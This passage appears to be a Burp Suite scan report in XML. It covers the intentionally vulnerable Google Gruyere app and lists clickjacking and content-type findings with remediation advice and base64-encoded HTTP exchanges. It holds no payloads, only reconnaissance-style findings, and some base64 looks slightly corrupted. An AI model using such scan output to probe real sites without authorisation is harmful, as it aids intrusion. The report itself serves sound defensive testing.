      <request method="GET" base64="true"><![CDATA[R0VUICLyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogOWEzNzg1OTg5ZWEzMTZkOTYxYzkyYTFhZTBhNTNiYmINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODo0NCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4663334864234433536</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/code]]></path>
    <location><![CDATA[/code]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9jb2RlIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDBlNDk4Y2MwYmJlYzMxYzRlMTk5ODMwNDMxNjhhMjYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMjozNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBGcmFtZXNldC8vRU4iCiAgICJodHRwczovL3d3dy53My5vcmcvVFIvaHRtbDQvZnJhbWVzZXQuZHRkIj4KPEhUTUw+CjxIRUFEPgo8VElUTEU+R3J1eWVyZSBDb2RlPC9USVRMRT4KPC9IRUFEPgo8RlJBTUVTRVQgY29scz0iMTY1LDEwMCUiPgogIDxGUkFNRSBzcmM9Ii9zdGF0aWMvY29kZWluZGV4Lmh0bWwiPgogIDxGUkFNRSBuYW1lPSJjb2RlcGFnZSIgc3JjPSIiPgogIDxOT0ZSQU1FUz4KICAgIDxBIGhyZWY9Ii9zdGF0aWMvY29kZWluZGV4L2h0bWwiPkNvZGUgSW5kZXg8L0E+CiAgPC9OT0ZSQU1FUz4KPC9GUkFNRVNFVD4KPC9IVE1MPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1228839009181847552</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/code/]]></path>
    <location><![CDATA[/code/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9jb2RlLyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9wYXJ0MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMmU3YjVhMjQ0MTBkZGQ5YmQ3ODc5NTM1MmE4NmE5MmMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMjozNyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBGcmFtZXNldC8vRU4iCiAgICJodHRwczovL3d3dy53My5vcmcvVFIvaHRtbDQvZnJhbWVzZXQuZHRkIj4KPEhUTUw+CjxIRUFEPgo8VElUTEU+R3J1eWVyZSBDb2RlPC9USVRMRT4KPC9IRUFEPgo8RlJBTUVTRVQgY29scz0iMTY1LDEwMCUiPgogIDxGUkFNRSBzcmM9Ii9zdGF0aWMvY29kZWluZGV4Lmh0bWwiPgogIDxGUkFNRSBuYW1lPSJjb2RlcGFnZSIgc3JjPSIiPgogIDxOT0ZSQU1FUz4KICAgIDxBIGhyZWY9Ii9zdGF0aWMvY29kZWluZGV4L2h0bWwiPkNvZGUgSW5kZXg8L0E+CiAgPC9OT0ZSQU1FUz4KPC9GUkFNRVNFVD4KPC9IVE1MPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8330561455337279488</serialNumber>
    <type>8389632</type>
    <name><![CDATA[Content type incorrectly stated]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/gruyere-code.zip]]></path>
    <location><![CDATA[/gruyere-code.zip]]></location>
    <severity>Low</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a  response specifies an incorrect content type then browsers may process the response in unexpected ways. If the  content type is specified to be a renderable text-based format, then the browser will usually attempt to interpret the response as being in that format, regardless of the actual contents of the response. Additionally, some other specified content types might sometimes be interpreted as HTML due to quirks in particular browsers. This behavior might lead to otherwise &quot;safe&quot; content such as images  being rendered as HTML, enabling cross-site scripting attacks in certain conditions.</p>
<p>The presence of an incorrect content type statement typically only constitutes a security flaw when the affected resource is dynamically generated, uploaded by a user, or otherwise contains user input. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing a message body, the application should include a single Content-type header that correctly and unambiguously states the MIME type of the content in the response body.</p>
<p>Additionally, the response header &quot;X-content-type-options: nosniff&quot; should be returned in all responses to reduce the likelihood that browsers will interpret content in a way that disregards the Content-type header.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The response states that the content type is <b>application/zip</b>. However, it actually appears to contain <b>unrecognized content</b>.<br><br>If the URL path can be manipulated to end with &quot;.html&quot;, the following browsers may interpret the response as HTML:<ul><li>Internet Explorer 11</li><li>Internet Explorer 11 (Compatibility Mode)</li></ul>]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9ncnV5ZXJlLWNvZGUuemlwIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3BhcnQxDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7481206014910218240</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part1]]></path>
    <location><![CDATA[/part1]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0MSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogY2E5ZjVlNTRhZWY1MGQwMDY5ZGM1OWM1NmJmZWJiNjkNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoyMCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMTM2ODYNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjxIVE1MPjxIRUFEPjxNRVRBIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8VElUTEU+V2ViIEFwcGxpY2F0aW9uIEV4cGxvaXRzIGFuZCBEZWZlbnNlczwvVElUTEU+CjxMSU5LIHR5cGU9InRleHQvY3NzIiByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4uL3N0YXRpYy9jb2RlbGFiLmNzcyI+CjwhLS1NQVJLLVotLT4KPFNDUklQVD4KZnVuY3Rpb24gdG9nZ2xlQmxvY2soaGVhZGluZywgd2hpY2hJRCkgewogIHZhciBpbWFnZSA9IGhlYWRpbmcuY2hpbGROb2RlswXTsKICB2YXIgYmxvY2sgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCh3aGljaElEKTsKICBpZiAoYmxvY2spIHsKICAgIGlmIChnZXREaXNwbGF5KGJsb2NrKSA9PSAnYmxvY2snKSB7CiAgICAgIGJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgICAgIGltYWdlLnNyYyA9ICdzdGF0aWMvY2xvc2VkLmdpZic7CiAgICB9IGVsc2UgeyAgICAvLyAibm9uZSIgb3IgIiIKICAgICAgYmxvY2suc3R5bGUuZGlzcGxheSA9ICdibG9jayc7CiAgICAgIGltYWdlLnNyYyA9ICdzdGF0aWMvb3Blbi5naWYnOwogICAgfQogIH0KfQoKZnVuY3Rpb24gZ2V0RGlzcGxheShibG9jaykgewogIHZhciB2YWx1ZSA9IGJsb2NrLnN0eWxlLmRpc3BsYXk7CiAgaWYgKCF2YWx1ZSkgewogICAgaWYgKGRvY3VtZW50LmRlZmF1bHRWaWV3KSB7CiAgICAgIHZhciBjb21wdXRlZFN0eWxlID0gZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShibG9jaywgIiIpOwogICAgICB2YWx1ZSA9IGNvbXB1dGVkU3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSgnZGlzcGxheScpOwogICAgfSBlbHNlIGlmIChibG9jay5jdXJyZW50U3R5bGUpIHsKICAgICAgdmFsdWUgPSBibG9jay5jdXJyZW50U3R5bGUuZGlzcGxheTsKICAgIH0KICB9CiAgcmV0dXJuIHZhbHVlOwp9CjwvU0NSSVBUPgo8L0hFQUQ+CjxCT0RZIGJnY29sb3I9IiNmZmZmZmYiPgoKPERJViBjbGFzcz0iYmFubmVyIj48L0RJVj4KPEgxPjxGT05UIHNpemU9IisyIj48SU1HIHNyYz0iL3N0YXRpYy9ncnV5ZXJlLTc4LnBuZyIgc3R5bGU9InZlcnRpY2FsLWFsaWduOm1pZGRsZSI+CldlYiBBcHBsaWNhdGlvbiBFeHBsb2l0cyBhbmQgRGVmZW5zZXMgIChQYXJ0IDEpPC9GT05UPiA8L0gxPgo8UD4KQSBDb2RlbGFiIGJ5IEJydWNlIExlYmFuLCBNdWdkaGEgQmVuZHJlLCBhbmQgUGFyaXNhIFRhYnJpego8L1A+CjxESVYgY2xhc3M9InByaW50YWJsZSI+CjxESVYgY2xhc3M9ImNvbHVtbjEiPgpUYWJsZSBvZiBDb250ZW50cwo8VUw+CjxMSSBjbGFzcz0iTDEiIHN0eWxlPSJwYWRkaW5nLXRvcDowcHQiPiA8QSBocmVmPSIvIzBfX2hhY2tlcnMiPkJlYXQgdGhlIGhhY2tlcnM8L0E+PC9MST4KPExJIGNsYXNzPSJMMSIgc3R5bGU9InBhZGRpbmctdG9wOjBwdCI+IDxBIGhyZWY9Ii8jMF9fZ3J1eWVyZSI+R3J1eWVyZTwvQT48L0xJPgo8TEkgY2xhc3M9IkwxIj4gPEEgaHJlZj0iL3BhcnQxIzFfX3NldHVwIj5TZXQtdXA8L0E+CiAgPFVMPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDEjMV9fcmVzZXRfYnV0dG9uIj5SZXNldCBCdXR0b248L0E+PC9MST4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQxIzFfX2Fib3V0X3RoZV9jb2RlIj5BYm91dCB0aGUgQ29kZTwvQT48L0xJPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDEjMV9fZmVhdHVyZXNfYW5kX3RlY2hub2xvZ2llcyI+RmVhdHVyZXMgYW5kIFRlY2hub2xvZ2llczwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0MSMxX191c2luZ19ncnV5ZXJlIj5Vc2luZyBHcnV5ZXJlPC9BPjwvTEk+CjxMSSBjbGFzcz0iTDEiPiA8QSBocmVmPSIvcGFydDIjMl9fY3Jvc3Nfc2l0ZV9zY3JpcHRpbmciPkNyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpPC9BPgogIDxVTD4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQyIzJfX3hz9jaGFsbGVuZ2UiPlhTUyBDaGFsbGVuZ2VzPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0MiMyX19maWxlX3VwbG9hZF94c3MiPkZpbGUgVXBsb2FkIFhTUzwvQT48L0xJPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDIjMl9fcmVmbGVjdGVkX3hzcyI+UmVmbGVjdGVkIFhTUzwvQT48L0xJPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDIjMl9fc3RvcmVkX3hzcyI+U3RvcmVkIFhTUzwvQT48L0xJPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDIjMl9fc3RvcmVkX3hz92aWFfaHRtbF9hdHRyaWJ1dGUiPlN0b3JlZCBYU1MgdmlhIEhUTUwgQXR0cmlidXRlPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0MiMyX19zdG9yZWRfeHNzX3ZpYV9hamF4Ij5TdG9yZWQgWFNTIHZpYSBBSkFYPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0MiMyX19yZWZsZWN0ZWRfeHNzX3ZpYV9hamF4Ij5SZWZsZWN0ZWQgWFNTIHZpYSBBSkFYPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0MiMyX19tb3JlX2Fib3V0X3hzcyI+TW9yZSBhYm91dCBYU1M8L0E+PC9MST4KICA8L1VMPjwvTEk+CjxMSSBjbGFzcz0iTDEiPiA8QSBocmVmPSIvcGFydDMjM19fY2xpZW50X3N0YXRlX21hbmlwdWxhdGlvbiI+Q2xpZW50LVN0YXRlIE1hbmlwdWxhdGlvbjwvQT4KICA8VUw+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0MyMzX19lbGV2YXRpb25fb2ZfcHJpdmlsZWdlIj4gRWxldmF0aW9uIG9mIFByaXZpbGVnZSA8L0E+PC9MST4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQzIzNfX2Nvb2tpZV9tYW5pcHVsYXRpb24iPiBDb29raWUgTWFuaXB1bGF0aW9uIDwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0MyMzX19jcm9z9zaXRlX3JlcXVlc3RfZm9yZ2VyeSI+Q3Jvc3MtU2l0ZSBSZXF1ZXN0IEZvcmdlcnkgKFhTUkYpPC9BPgogIDxVTD4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQzIzNfX3hzcmZfY2hhbGxlbmdlIj5YU1JGIENoYWxsZW5nZTwvQT48L0xJPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDMjM19fbW9yZV9hYm91dF9wcmV2ZW50aW5nX3hzcmYiPk1vcmUgYWJvdXQgcHJldmVudGluZyBYU1JGPC9BPjwvTEk+CiAgPC9VTD48L0xJPgo8TEkgY2xhc3M9IkwxIj4gPEEgaHJlZj0iL3BhcnQzIzNfX2Nyb3NzX3NpdGVfc2NyaXB0X2luY2x1c2lvbiI+Q3Jvc3MgU2l0ZSBTY3JpcHQgSW5jbHVzaW9uIChYU1NJKTwvQT4KICA8VUw+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0MyMzX194c3NpX2NoYWxsZW5nZSI+WFNTSSBDaGFsbGVuZ2U8L0E+PC9MST4KICA8L1VMPjwvTEk+CjxMSSBjbGFzcz0iTDEiPiA8QSBocmVmPSIvcGFydDQjNF9fcGF0aF90cmF2ZXJzYWwiPlBhdGggVHJhdmVyc2FsPC9BPgogIDxVTD4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ0IzRfX2luZm9ybWF0aW9uX2Rpc2Nsb3N1cmVfcGF0aF90cmF2ZXJzYWwiPkluZm9ybWF0aW9uIGRpc2Nsb3N1cmUgdmlhIHBhdGggdHJhdmVyc2FsIDwvQT48L0xJPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDQjNF9fZGF0YV90YW1wZXJpbmdfcGF0aF90cmF2ZXJzYWwiPkRhdGEgdGFtcGVyaW5nIHZpYSBwYXRoIHRyYXZlcnNhbCA8L0E+PC9MST4KICA8L1VMPjwvTEk+CjxMSSBjbGFzcz0iTDEiPiA8QSBocmVmPSIvcGFydDQjNF9fZGVuaWFsX29mX3NlcnZpY2UiPkRlbmlhbCBvZiBTZXJ2aWNlPC9BPgogIDxVTD4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ0IzRfX2Rv9xdWl0X3NlcnZlciI+RG9TIC0gUXVpdCB0aGUgU2VydmVyPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NCM0X19kb3Nfb3ZlcmxvYWRfc2VydmVyIj5Eb1MgLSBPdmVybG9hZGluZyB0aGUgU2VydmVyPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NCM0X19tb3JlX2RvcyI+TW9yZSBvbiBEZW5pYWwgb2YgU2VydmljZTwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0NCM0X19jb2RlX2V4ZWN1dGlvbiI+Q29kZSBFeGVjdXRpb248L0E+CiAgPFVMPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDQjNF9fY29kZV9leGVjdXRpb25fY2hhbGxlbmdlIj5Db2RlIEV4ZWN1dGlvbiBDaGFsbGVuZ2U8L0E+PC9MST4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ0IzRfX21vcmVfY29kZV9leGVjdXRpb24iPk1vcmUgb24gUmVtb3RlIENvZGUgRXhlY3V0aW9uPC9BPjwvTEk+CiAgPC9VTD48L0xJPgo8TEkgY2xhc3M9IkwxIj4gPEEgaHJlZj0iL3BhcnQ1IzVfX2NvbmZpZ3VyYXRpb25fdnVsbmVyYWJpbGl0aWVzIj5Db25maWd1cmF0aW9uIFZ1bG5lcmFiaWxpdGllczwvQT4KICA8VUw+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19pbmZvcm1hdGlvbl9kaXNjbG9zdXJlX2NvbmZpZ18xIj5JbmZvcm1hdGlvbiBkaXNjbG9zdXJlICMxPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19pbmZvcm1hdGlvbl9kaXNjbG9zdXJlX2NvbmZpZ18yIj5JbmZvcm1hdGlvbiBkaXNjbG9zdXJlICMyPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19pbmZvcm1hdGlvbl9kaXNjbG9zdXJlX2J1Z18zIj5JbmZvcm1hdGlvbiBkaXNjbG9zdXJlICMzIDwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19hamF4X3Z1bG5lcmFiaWxpdGllcyI+QUpBWCB2dWxuZXJhYmlsaXRpZXM8L0E+CiAgPFVMPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDUjNV9fZG